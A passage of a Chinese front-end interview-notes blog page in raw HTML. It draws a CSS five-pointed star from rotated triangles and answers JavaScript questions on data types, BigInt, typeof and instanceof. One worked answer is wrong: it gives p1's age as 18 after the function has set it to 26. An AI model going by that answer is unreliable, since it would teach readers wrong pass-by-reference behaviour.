class="hljs-selector-pseudo">::before</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">        <span class="hljs-attribute">left</span>: -<span class="hljs-number">40px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>: -<span class="hljs-number">30px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">74deg</span>);</span><br><span class="language-css">        <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">box-sizing</span>: content-box;</span><br><span class="language-css">        <span class="hljs-attribute">border-width</span>: <span class="hljs-number">60px</span> <span class="hljs-number">80px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-style</span>: solid;</span><br><span class="language-css">        <span class="hljs-attribute">border-color</span>: transparent transparent red transparent;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; display: flex; justify-content: center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;star&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><style>    .star3 {        transform: rotate(-37deg);        width: 0px;        height: 0px;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent violet transparent;        margin-bottom: 40px;        position: relative;    }    .star3::before {        position: absolute;        left: -40px;        top: -30px;        transform: rotate(74deg);        content: "";        display: block;        width: 0;        height: 0;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent red transparent;    }    .star3::after {        position: absolute;        left: -106px;        top: -39px;        transform: rotate(-71deg);        content: "";        display: block;        width: 0;        height: 0;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent cornflowerblue transparent;    }</style><div style="width: 100%; display: flex; justify-content: center">    <div class="star3"></div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.star</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">37deg</span>);</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">0px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">0px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">box-sizing</span>: content-box;</span><br><span class="language-css">        <span class="hljs-attribute">border-width</span>: <span class="hljs-number">60px</span> <span class="hljs-number">80px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-style</span>: solid;</span><br><span class="language-css">        <span class="hljs-attribute">border-color</span>: transparent transparent violet transparent;</span><br><span class="language-css">        <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.star</span><span class="hljs-selector-pseudo">::before</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">        <span class="hljs-attribute">left</span>: -<span class="hljs-number">40px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>: -<span class="hljs-number">30px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">74deg</span>);</span><br><span class="language-css">        <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">box-sizing</span>: content-box;</span><br><span class="language-css">        <span class="hljs-attribute">border-width</span>: <span class="hljs-number">60px</span> <span class="hljs-number">80px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-style</span>: solid;</span><br><span class="language-css">        <span class="hljs-attribute">border-color</span>: transparent transparent red transparent;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.star</span><span class="hljs-selector-pseudo">::after</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">        <span class="hljs-attribute">left</span>: -<span class="hljs-number">106px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>: -<span class="hljs-number">39px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">71deg</span>);</span><br><span class="language-css">        <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">box-sizing</span>: content-box;</span><br><span class="language-css">        <span class="hljs-attribute">border-width</span>: <span class="hljs-number">60px</span> <span class="hljs-number">80px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-style</span>: solid;</span><br><span class="language-css">        <span class="hljs-attribute">border-color</span>: transparent transparent cornflowerblue transparent;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; display: flex; justify-content: center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;star3&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>由于度数是近似的，长度也是近似的，很难达到百分之一百精准。大致是一个三角形，如果我们把颜色换成同一个的话，看起来会更像。</p><style>    .star4 {        transform: rotate(-37deg);        width: 0px;        height: 0px;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent gold transparent;        margin-bottom: 40px;        position: relative;    }    .star4::before {        position: absolute;        left: -40px;        top: -30px;        transform: rotate(74deg);        content: "";        display: block;        width: 0;        height: 0;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent gold transparent;    }    .star4::after {        position: absolute;        left: -106px;        top: -39px;        transform: rotate(-71deg);        content: "";        display: block;        width: 0;        height: 0;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent gold transparent;    }</style><div style="width: 100%; display: flex; justify-content: center">    <div class="star4"></div></div><blockquote><p>目前我们已经用CSS画了三角形、平行四边形和五角星了，实际上这些图形都可以用<code>clip-path</code>来绘制蒙版实现。以后看有时间画一下吧。这也是CSS面经的结尾了。</p></blockquote><h1 id="javascipt"><a class="markdownIt-Anchor" href="#javascipt"></a> JavaScipt</h1><h2 id="1js原始数据类型有哪些引用数据类型有哪些"><a class="markdownIt-Anchor" href="#1js原始数据类型有哪些引用数据类型有哪些"></a> 1.JS原始数据类型有哪些？引用数据类型有哪些？</h2><blockquote><p>由于很多原始数据类型 有它的原始值包装类型，这里用小写表示原始值，大写表示包装类型。</p></blockquote><p>JS中存在着7种原始值。资料来源<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures">MDN</a></p><ol><li>null</li><li>undefined</li><li>number</li><li>string</li><li>boolean</li><li>symbol</li><li>bigint</li></ol><p>引用数据类型</p><ol><li>Object</li><li>String</li><li>Number</li><li>Boolean</li><li>Array</li><li>Map</li><li>Set</li><li>Date</li><li>RegExp</li><li>Math</li><li>Function</li><li>等等 【总之是对象就是引用数据类型】</li></ol><h2 id="2-说出下面运行的结果解释原因"><a class="markdownIt-Anchor" href="#2-说出下面运行的结果解释原因"></a> 2. 说出下面运行的结果，解释原因。</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">person</span>) &#123;<br>    person.<span class="hljs-property">age</span> = <span class="hljs-number">26</span><br>    person = &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;hzj&#x27;</span>,<br>        <span class="hljs-attr">age</span>: <span class="hljs-number">18</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> person<br>&#125;<br><span class="hljs-keyword">const</span> p1 = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;fyq&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">19</span><br>&#125;<br><span class="hljs-keyword">const</span> p2 = <span class="hljs-title function_">test</span>(p1)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p1) <span class="hljs-comment">// -&gt; ?</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p2) <span class="hljs-comment">// -&gt; ?</span><br></code></pre></td></tr></table></figure><p>结果是</p><p><code>p1: &#123;name: 'fyq', age: 18&#125;</code></p><p><code>p2: &#123;name: 'hzj', age: 18&#125;</code></p><p>函数传参的时候传递的是对地址的引用，函数中设置age会实际改变内存中的对象。所以p1发生了改变。然后右新建一个新的对象，作为函数的返回，p2变成了便是新对象的引用。</p><h2 id="3-null是对象吗为什么"><a class="markdownIt-Anchor" href="#3-null是对象吗为什么"></a> 3. null是对象吗？为什么？</h2><p>null不是对象，null是js中的一个原始值。<code>typeof null</code>会输出object是JS存在的一个悠久的bug。在JS的最初版本中使用的是32位系统，为了性能考虑使用低位存储变量的类型信息，000开头代表是对象，而null表示位全零，所以将它错误地判断为了object。</p><blockquote><p>曾有一个 ECMAScript 的修复提案（通过选择性加入的方式），但被拒绝了。该提案会导致 typeof null === ‘null’。<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof">MDN</a></p></blockquote><h2 id="4-1tostring为什么可以调用"><a class="markdownIt-Anchor" href="#4-1tostring为什么可以调用"></a> 4. ‘1’.toString()为什么可以调用？</h2><p>因为JS帮我们自动化做了许多工作。包括</p><ol><li>创建一个String类型的实例</li><li>调用实例上的特定方法</li><li>销毁实例</li></ol><p>可以把以上三部想象成执行了如下三行js代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;1&quot;</span>)<br>s.<span class="hljs-title function_">toString</span>()<br>s = <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>值得注意的是，自动创建的原始值包装对象只存在于 “1”.toString那一行代码，这意味着不能给原始值添加新的属性和方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> s = <span class="hljs-string">&quot;wuuconix&quot;</span><br>s.<span class="hljs-property">flag</span> = <span class="hljs-string">&quot;yyds&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s.<span class="hljs-property">flag</span>) <span class="hljs-comment">//undefined</span><br></code></pre></td></tr></table></figure><h2 id="5-0102为什么不等于03"><a class="markdownIt-Anchor" href="#5-0102为什么不等于03"></a> 5. 0.1+0.2为什么不等于0.3？</h2><p>因为JS中number类型是按照IEEE 754 来存储的，0.1在0.2在转换为二进制的时候会无限循环，由于标准位数的限制后面多余的位数会被裁掉，此时就出现了精度的损失，相加后的二进制在转化为十进制就会变成 <code>0.30000000000000004</code></p><blockquote><p>3后面有15个0</p><p>参考链接 <a href="https://zhuanlan.zhihu.com/p/95318421">详解js中0.1+0.2!=0.3 - 知乎</a></p></blockquote><h2 id="6-什么是bigint"><a class="markdownIt-Anchor" href="#6-什么是bigint"></a> 6. 什么是BigInt?</h2><p>BigInt是JS中最新的基本数据类型。</p><p>由于JS中的number使用了IEEE 754标准，当整数大于 <code>Number.MAX_SAFE_INTEGER（9007199254740991）</code> 的时候，将会被自动四舍五入，所以会出现以下情况。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">9007199254740992</span> === <span class="hljs-number">9007199254740993</span> <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>这使得在JS中对大整数的算数运算有精度损失的风险，在BigInt出现之前，我们只能利用一些第三方库，比如<a href="https://github.com/MikeMcl/bignumber.js/">bignumber.js</a>。</p><p>而BigInt的出现打破了这个痛点。</p><p>要创建一个BigInt，我们可以直接在数字后面加上一个<code>n</code>即可，十分优雅，或者你也可以使用<code>BigInt(&quot;9007199254740993&quot;)</code>构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">9007199254740992n</span> === <span class="hljs-number">9007199254740993n</span> <span class="hljs-comment">//false</span><br><span class="hljs-title class_">BigInt</span>(<span class="hljs-string">&quot;9007199254740992&quot;</span>) === <span class="hljs-title class_">BigInt</span>(<span class="hljs-string">&quot;9007199254740993&quot;</span>) <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><p>这里我还想讨论一个问题，那就是为什么构造一个bigint的时候，构造函数<code>BigInt()</code>之前没有new关键字。</p><p>根据我的想法，是因为这个BigInt() 不是一个包装函数的构造函数，它只是一个普通的转换函数。它的作用是把一个number原始值转化为一个bigint原始值。这和<code>Number(&quot;1&quot;)</code>这个转换函数是一样的，把字符串变成了number原始值。</p><p>解决了这个问题，我们可能还有一个疑问，我们知道了转换函数，那<code>new BigInt()</code>是不是会构造出bigint原始值的包装对象【<code>primitive wrapper object</code>】呢？很可惜，JS貌似没有提供这种方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInt</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">//Uncaught TypeError: BigInt is not a constructor at new BigInt (&lt;anonymous&gt;)</span><br></code></pre></td></tr></table></figure><p>所以我们不能像<code>new String(&quot;1&quot;)，new Number(1)，new Boolean(true)</code>这样创建原始值的包装对象了，但这样貌似没有什么不好的，要知道，在正常写代码中，几乎没有人会这样写，红宝书也是这样提醒我们的。</p><blockquote><p>可以显式地使用 Boolean、Number 和 String 构造函数创建原始值包装对象。不过应该在确实必<br />要时再这么做，否则容易让开发者疑惑，分不清它们到底是原始值还是引用值。在原始值包装类型的实<br />例上调用 typeof 会返回&quot;object&quot;，所有原始值包装对象都会转换为布尔值 true。</p></blockquote><p>所以在<code>没有人会显示声明原始值包装对象</code>的考虑下，JS对新的数据类型，symbol和bigint都没有提供包装对象的构造函数。</p><p>但是实际上，我们还是可以用<code>new Object(123n)</code>来创建一个bigint的包装对象。</p><blockquote><p>还可以参考一下这篇文章 <a href="https://www.zhihu.com/question/488070741">为什么BigInt、Symbol被设计为无法new和extends的？</a> 讲的也在理。</p></blockquote><h2 id="7-为什么需要bigint"><a class="markdownIt-Anchor" href="#7-为什么需要bigint"></a> 7. 为什么需要BigInt?</h2><p>参考 <a href="#6-什么是bigint" class="tocbot-link node-name--H2 ">6. 什么是BigInt?</a></p><h2 id="8-如何创建并使用bigint"><a class="markdownIt-Anchor" href="#8-如何创建并使用bigint"></a> 8. 如何创建并使用BigInt？</h2><ol><li><p>数字末尾加n</p></li><li><p>使用BigInt转型函数。</p><blockquote><p>很多人，包括<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt#constructor">MDN</a> 也说它是构造函数，但是鉴于它不能使用new关键字来创建包装对象的事实，我认为它更适合叫做转型函数，即把number原始值转换为bigint原始值。</p></blockquote></li></ol><p>简单使用如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">10n</span> + <span class="hljs-number">20n</span> <span class="hljs-comment">//30n</span><br><span class="hljs-number">10n</span> - <span class="hljs-number">20n</span> <span class="hljs-comment">//-10n</span><br>+<span class="hljs-number">10n</span> <span class="hljs-comment">//Uncaught TypeError: Cannot convert a BigInt value to a number</span><br>-<span class="hljs-number">10n</span> <span class="hljs-comment">//-10n</span><br><span class="hljs-number">10n</span> * <span class="hljs-number">20n</span> <span class="hljs-comment">//200n</span><br><span class="hljs-number">20n</span> / <span class="hljs-number">10n</span> <span class="hljs-comment">//2n</span><br><span class="hljs-number">23n</span> % <span class="hljs-number">10n</span> <span class="hljs-comment">//3n</span><br><span class="hljs-number">10n</span> ** <span class="hljs-number">3n</span> <span class="hljs-comment">//1000n</span><br><br><span class="hljs-keyword">let</span> x = <span class="hljs-number">10n</span><br><br>++x <span class="hljs-comment">//11n</span><br>--x <span class="hljs-comment">//9n</span><br><span class="hljs-keyword">typeof</span> x <span class="hljs-comment">//&#x27;bigint&#x27;</span><br></code></pre></td></tr></table></figure><p>值得警惕的点</p><ol><li><p>bigint不支持一元加号运算符，这可能是由于某些程序依赖+始终生成Number 或者抛出异常。更改+的行为也会破坏<a href="https://www.zhihu.com/question/25483589">asm.js</a>的代码。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">+<span class="hljs-string">&quot;1&quot;</span>    <span class="hljs-comment">//1</span><br>+[]     <span class="hljs-comment">//0</span><br></code></pre></td></tr></table></figure></li><li><p>因为隐式类型可能会丢失信息，所以不允许在bigint和number之间的混合操作。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1</span> + <span class="hljs-number">1n</span>  <span class="hljs-comment">//Uncaught TypeError: Cannot mix BigInt and other types, use explicit conversions</span><br></code></pre></td></tr></table></figure></li><li><p>不能将bigint传递web api或者js的内置函数，那些函数需要一个number类型的数字。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">1n</span>, <span class="hljs-number">2n</span>)    <span class="hljs-comment">//Uncaught TypeError: Cannot convert a BigInt value to a number</span><br></code></pre></td></tr></table></figure></li><li><p>当boolean和bigint类型相遇时，bigint和number类似，即 只要不是 0n ，bigint都会当作 truthy</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-number">0n</span>) &#123;   <span class="hljs-comment">//false</span><br><br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">3n</span>) &#123;   <span class="hljs-comment">//true</span><br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>元素都为bigint的数组可以进行sort，但是sort默认是ascii排序，作用不大。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = [<span class="hljs-number">2n</span>, <span class="hljs-number">11n</span>, <span class="hljs-number">3n</span>]<br>a.<span class="hljs-title function_">sort</span>()    <span class="hljs-comment">//[ 11n, 2n, 3n ]</span><br>a = [<span class="hljs-number">2n</span>, <span class="hljs-number">11n</span>, <span class="hljs-number">3n</span>]<br>a.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b) <span class="hljs-comment">//Uncaught TypeError: Cannot convert a BigInt value to a number</span><br></code></pre></td></tr></table></figure><p>搞不太懂，为什么明明都是bigint，确报这个错，所以暂时没法用sort来真正的按值排序。</p></li><li><p>bigint可以正常地进行位运算 如 | &amp; &lt;&lt; &gt;&gt; ^</p></li></ol><h2 id="9typeof-是否能正确判断类型"><a class="markdownIt-Anchor" href="#9typeof-是否能正确判断类型"></a> 9.typeof 是否能正确判断类型？</h2><p>对于原始类型来说，除了null都可以调用typeof显示正确的类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">typeof</span> <span class="hljs-number">1</span> <span class="hljs-comment">//&#x27;number&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-comment">//&#x27;string&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">undefined</span> <span class="hljs-comment">//&#x27;undefined&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">true</span> <span class="hljs-comment">//&#x27;boolean&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Symbol</span>() <span class="hljs-comment">//&#x27;symbol&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span> <span class="hljs-comment">//&#x27;object&#x27;</span><br></code></pre></td></tr></table></figure><p>对于引用数据类型，除了函数之外，都会显示&quot;object&quot;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">typeof</span> [] <span class="hljs-comment">//&#x27;object&#x27;</span><br><span class="hljs-keyword">typeof</span> &#123;&#125; <span class="hljs-comment">//&#x27;object&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span> <span class="hljs-comment">//&#x27;function&#x27;</span><br></code></pre></td></tr></table></figure><p>所以利用typeof来判断 <code>引用数据类型 / 对象数据类型</code> 是不合适的，更适合用instanceof。instanceof基于原型链查询，只要处于原型链中，判断永远为true。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> s = <span class="hljs-string">&quot;123&quot;</span><br>s <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span> <span class="hljs-comment">//false</span><br>s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;123&quot;</span>)<br>s <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span> <span class="hljs-comment">//true</span><br>s <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span> <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><h2 id="10-instanceof能否判断基本数据类型"><a class="markdownIt-Anchor" href="#10-instanceof能否判断基本数据类型"></a> 10. instanceof能否判断基本数据类型？</h2><p>正常情况下不行，instanceof只适合用来判断 引用数据类型 / 对象数据类型，而不应该用来判断原始值。</p><p>如果强行重定义类内部的instanceof方法，那是可以的，但是本质上还是调用了typeof。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PrimitiveNumber</span> &#123;<br>    <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](x) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> x === <span class="hljs-string">&#x27;number&#x27;</span><br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PrimitiveNumber</span>) <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrimitiveNumber</span>() <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PrimitiveNumber</span>) <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><blockquote><p>这里的例子由于直接返回了typeof的判断，失去了原先instanceof的功能，如果我们在实际中，我们需要兼顾之前的返回值，应该在不破坏原先instanceof功能的情况下加入typeof的判断。</p></blockquote><h2 id="11-能不能手动实现一下instanceof的功能"><a class="markdownIt-Anchor" href="#11-能不能手动实现一下instanceof的功能"></a> 11. 能不能手动实现一下instanceof的功能？</h2><p>核心： 基于原型链的向上查找</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title function_">myInstanceOf</span> = (<span class="hljs-params">ins, cons</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ins != <span class="hljs-string">&#x27;object&#x27;</span> || ins === <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//原始值直接返回false</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(ins)<br>    <span class="hljs-keyword">while</span> (proto != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (proto == cons.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto)<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-title function_">myInstanceOf</span>(<span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-title class_">String</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title function_">myInstanceOf</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;&quot;</span>), <span class="hljs-title class_">String</span>) <span class="hljs-comment">//true</span><br><span class="hljs-title function_">myInstanceOf</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">123</span>), <span class="hljs-title class_">String</span>) <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><p>实际上利用<a 